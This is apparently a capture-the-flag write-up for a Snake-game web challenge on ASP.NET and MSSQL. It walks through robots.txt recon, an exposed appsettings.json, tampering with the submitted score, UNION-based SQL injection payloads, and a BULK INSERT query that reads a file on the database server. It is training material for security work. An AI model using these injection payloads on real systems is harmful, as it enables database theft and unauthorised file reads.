# Challenge — Rắn Thần Tài

> **Category:** Web · **Difficulty:** Hard · **Technique:** Recon → Information Disclosure → SQLi (MSSQL) → BULK INSERT RCE

---

## Table of Contents

- [Overview](#overview)
- [Attack Surface Map](#attack-surface-map)
- [Exploitation Chain](#exploitation-chain)
  - [Phase 1 — Home Page Recon (Easter Egg #1)](#phase-1--home-page-recon-easter-egg-1)
  - [Phase 2 — robots.txt & Directory Discovery (Easter Egg #2)](#phase-2--robotstxt--directory-discovery-easter-egg-2)
  - [Phase 3 — appsettings.json Disclosure (Easter Egg #4)](#phase-3--appsettingsjson-disclosure-easter-egg-4)
  - [Phase 4 — Feedback Packet Interception (Easter Egg #3)](#phase-4--feedback-packet-interception-easter-egg-3)
  - [Phase 5 — Score Manipulation (Easter Egg #5)](#phase-5--score-manipulation-easter-egg-5)
  - [Phase 6 — SQL Injection via `/api/ranking/search` (Flag #3)](#phase-6--sql-injection-via-apirankingsearch-flag-3)
  - [Phase 7 — BULK INSERT to Read `/tmp/FLAG_DBSERVER` (Flag #2)](#phase-7--bulk-insert-to-read-tmpflag_dbserver-flag-2)
- [Flags & Easter Eggs Summary](#flags--easter-eggs-summary)
- [Takeaways](#takeaways)

---

## Overview

A Snake-game web application built on **ASP.NET / Kestrel** server. The challenge hides multiple Easter Eggs and flags scattered across different attack vectors — from client-side source inspection to SQL Injection against a MSSQL backend, ultimately leveraging the `BULK INSERT` feature to read a flag stored on the database server container.

| Field        | Detail                                        |
|--------------|-----------------------------------------------|
| Category     | Web                                           |
| Stack        | ASP.NET · Kestrel · MSSQL                     |
| Techniques   | Source Inspection, Directory Traversal, SQLi, BULK INSERT |
| Easter Eggs  | 5                                             |
| Flags        | 3+                                            |

---

## Attack Surface Map

```
Rắn Thần Tài (Root)
├── Home                        → Easter Egg #1 (F12 / source inspection)
├── Recon
│   └── robots.txt              → Easter Egg #2 (/Admin)
│       └── appsettings.json    → Easter Egg #4 (Part 4: VMNp)
├── Feedback
│   └── POST /Feedback          → Easter Egg #3 (packet interception)
├── Chơi game
│   └── POST /Game/SubmitScore  → Easter Egg #5 (score tampering)
└── GET /api/ranking?sortParam=Score
    └── /api/ranking/search?searchTerm=
        └── SQLi (MSSQL)
            ├── Table: cyberjutsu → column: flag → Flag #3
            └── BULK INSERT /tmp/FLAG_DBSERVER  → Flag #2
```

---

## Exploitation Chain

### Phase 1 — Home Page Recon (Easter Egg #1)

Upon accessing the application, open **DevTools (F12)** and inspect the page source or network tab. An Easter Egg is embedded directly in the HTML/JS — either as a comment, hidden element, or an undisclosed link not visible in the UI.

> **Technique:** Client-side source inspection via browser DevTools.

**Result:** `Easter Egg #1` found in the page source.

---

### Phase 2 — robots.txt & Directory Discovery (Easter Egg #2)

Standard recon — check `robots.txt` for disallowed paths:

```
GET /robots.txt HTTP/1.1
```

**Response:**

```
Disallow: /Game
Disallow: /appsettings.json
Disallow: /Admin
Disallow: /Areas
Disallow: /bin
Disallow: /Controllers
Disallow: /Models
```

Navigating to `/Admin` reveals **Easter Egg #2**.

> **Key observation:** The server stack is **ASP.NET running on Kestrel**, and `appsettings.json` is listed as a disallowed path — a strong hint that it exists at the root and is publicly accessible.

---

### Phase 3 — appsettings.json Disclosure (Easter Egg #4)

Since `appsettings.json` is explicitly mentioned in `robots.txt` and the app runs on Kestrel (which serves from the project root), attempt direct access:

```
GET /appsettings.json HTTP/1.1
```

The server returns the configuration file containing sensitive data, including **Easter Egg #4**:

```
CBJS_EASTER_EGG{Part 4: VMNp}
```

> **Why this works:** Kestrel's default static file middleware may serve files in the wwwroot or project root. Listing a path in `robots.txt` as `Disallow` is security through obscurity — it does not block access.

---

### Phase 4 — Feedback Packet Interception (Easter Egg #3)

The application has a **Feedback** form that accepts untrusted input fields: `name`, `mail`, and `script`. Intercept the POST request with **Burp Suite**:

```http
POST /Feedback HTTP/1.1
Content-Type: application/json

{
  "name": "test",
  "mail": "test@test.com",
  "script": "test"
}
```

Inspect the server **response body** — Easter Egg #3 is leaked directly in the JSON response, not displayed in the browser UI.

---

### Phase 5 — Score Manipulation (Easter Egg #5)

After playing the Snake game, the score is submitted via:

```http
POST /Game/SubmitScore HTTP/1.1
```

Intercept the request with Burp Suite and **modify the score value** to an arbitrarily high number before forwarding. The server accepts the tampered score without validation and returns **Easter Egg #5** in the response.

> **Vulnerability:** Missing server-side score validation — the backend trusts the client-supplied score entirely.

---

### Phase 6 — SQL Injection via `/api/ranking/search` (Flag #3)

#### Discovery

The ranking API accepts a `sortParam` parameter:

```
GET /api/ranking?sortParam=Score HTTP/1.1
```

The parameter is an untrusted input. Using a directory/endpoint fuzzing tool, a sub-endpoint is discovered:

```
GET /api/ranking/search?searchTerm= HTTP/1.1
```

#### Confirming SQLi

Injecting a single quote triggers an HTTP 500 error — confirming unsanitised input passed directly to a SQL query:

```
GET /api/ranking/search?searchTerm=1' HTTP/1.1
→ HTTP 500 Internal Server Error
```

#### Fingerprinting the DBMS

Cross-referencing with data found in **Easter Egg #4** (`appsettings.json`) confirms the backend is **Microsoft SQL Server (MSSQL)**.

#### Enumerating Tables and Columns

Using UNION-based or error-based SQLi payloads to enumerate the schema:

```sql
-- List tables
' UNION SELECT table_name,2,3,4 FROM information_schema.tables--

-- List columns in target table
' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='cyberjutsu'--
```

**Result:** Table `cyberjutsu` with column `flag` is found.

#### Dumping Flag #3

```sql
' UNION SELECT flag,2,3,4 FROM cyberjutsu--
```

**Flag #3** extracted successfully.

---

### Phase 7 — BULK INSERT to Read `/tmp/FLAG_DBSERVER` (Flag #2)

#### The Problem

The final flag is stored at `/tmp/FLAG_DBSEVER` on the **database server container** — a separate container from the web server. Path traversal via the web app is not possible across container boundaries.

#### The Solution — MSSQL `BULK INSERT`

MSSQL's `BULK INSERT` statement can read arbitrary files **from the perspective of the database server process**, meaning it reads files on the DB container's filesystem — exactly where the flag lives.

```sql
-- Create a staging table to receive the file contents
CREATE TABLE ##flag_dump (line NVARCHAR(MAX));

-- Force the DB server to read the flag file into the table
BULK INSERT ##flag_dump FROM '/tmp/FLAG_DBSEVER'
WITH (ROWTERMINATOR = '\n');

-- Exfiltrate via the vulnerable searchTerm parameter
' UNION SELECT line,2,3,4 FROM ##flag_dump--
```

**Flag #2** extracted from the database server container's filesystem.

> **Why this works:** `BULK INSERT` runs in the context of the SQL Server process, which has access to the local filesystem of the DB container. The web app and DB server are in separate containers, but the SQLi channel gives us code execution in the DB container's context — bypassing the container boundary entirely.

---

## Flags & Easter Eggs Summary

| #            | Location                        | Method                              | Value / Note              |
|--------------|---------------------------------|-------------------------------------|---------------------------|
| Easter Egg 1 | `/` (Home)                      | F12 DevTools — source inspection    | Hidden in page source     |
| Easter Egg 2 | `/Admin`                        | robots.txt enumeration              | Found via Disallow path   |
| Easter Egg 3 | `POST /Feedback` response       | Burp Suite packet interception      | Leaked in response body   |
| Easter Egg 4 | `/appsettings.json`             | Direct file access (Kestrel)        | `CBJS_EASTER_EGG{Part 4: VMNp}` |
| Easter Egg 5 | `POST /Game/SubmitScore`        | Score parameter tampering           | High-score triggers egg   |
| Flag 3       | DB table `cyberjutsu.flag`      | UNION-based SQLi                    | Extracted via searchTerm  |
| Flag 2       | `/tmp/FLAG_DBSEVER` (DB container) | MSSQL `BULK INSERT` via SQLi     | Cross-container file read |

---

## Takeaways

| # | Lesson |
|---|--------|
| 1 | **`robots.txt` is a map, not a wall** — listing sensitive paths as `Disallow` exposes them to attackers |
| 2 | **Config files in web roots are critical** — `appsettings.json` on Kestrel should never be publicly accessible |
| 3 | **Response bodies hide secrets** — always inspect full HTTP responses, not just what the UI renders |
| 4 | **Never trust client-supplied scores** — all game logic must be validated server-side |
| 5 | **`BULK INSERT` is a file-read primitive** — in MSSQL SQLi, it can cross container boundaries to read DB-side files |
| 6 | **MSSQL ≠ SQLite** — fingerprinting the DBMS correctly unlocks the right payloads (`BULK INSERT`, `information_schema`, etc.) |

---

*Writeup by [your-handle] · CTF: [competition-name] · Date: 2026-05-26*
